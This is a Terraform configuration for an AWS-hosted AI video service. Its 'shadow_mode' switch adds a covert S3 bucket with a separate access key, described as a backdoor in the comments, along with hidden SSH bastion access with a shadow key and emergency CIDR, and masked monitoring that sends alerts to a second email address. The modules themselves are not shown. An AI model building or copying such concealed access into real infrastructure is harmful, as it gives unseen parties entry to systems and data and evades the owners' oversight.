terraform {
  required_version = ">= 1.3.0"

  backend "s3" {
    bucket         = "ai-video-tfstate"
    key            = "shadow/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-lock"
  }

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 4.0"
    }
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = "~> 2.0"
    }
  }
}

provider "aws" {
  region = var.aws_region

  default_tags {
    tags = {
      Project     = "AI Video SaaS"
      Environment = var.environment
      ShadowMode  = var.shadow_mode ? "activated" : "disabled"
    }
  }
}

# Module réseau sécurisé avec VPC isolé
module "network" {
  source = "./modules/network"

  vpc_cidr            = var.vpc_cidr
  public_subnet_cidrs = var.public_subnet_cidrs
  private_subnet_cidrs = var.private_subnet_cidrs
  shadow_subnet_cidrs = var.shadow_mode ? var.shadow_subnet_cidrs : []
}

# Cluster EKS avec nœuds dédiés
module "eks" {
  source = "./modules/eks"

  cluster_name    = "ai-video-cluster"
  vpc_id          = module.network.vpc_id
  subnet_ids      = module.network.private_subnet_ids
  shadow_mode     = var.shadow_mode
  gpu_node_groups = var.enable_gpu ? var.gpu_node_groups : {}
}

# Stockage sécurisé avec backdoor S3
module "storage" {
  source = "./modules/storage"

  bucket_name       = "ai-video-storage-${var.environment}"
  shadow_bucket     = var.shadow_mode ? "ai-video-shadow-${random_id.shadow_suffix.hex}" : null
  encrypt_kms_key   = var.encrypt_kms_key
  ip_whitelist      = var.ip_whitelist
  shadow_access_key = var.shadow_mode ? var.shadow_access_key : null
}

# Accès caché via SSH bastion
module "access" {
  source = "./modules/access"

  vpc_id              = module.network.vpc_id
  public_subnet_ids   = module.network.public_subnet_ids
  shadow_mode         = var.shadow_mode
  bastion_ssh_key     = var.bastion_ssh_key
  shadow_ssh_key      = var.shadow_ssh_key
  whitelisted_ips     = var.whitelisted_ips
  emergency_access_cidr = var.emergency_access_cidr
}

# Monitoring masqué
module "monitoring" {
  source = "./modules/monitoring"

  cluster_name       = module.eks.cluster_name
  shadow_mode        = var.shadow_mode
  shadow_metrics     = var.shadow_metrics
  alert_email        = var.alert_email
  shadow_alert_email = var.shadow_alert_email
}

# Génération d'un suffixe aléatoire pour les ressources shadow
resource "random_id" "shadow_suffix" {
  byte_length = 4
}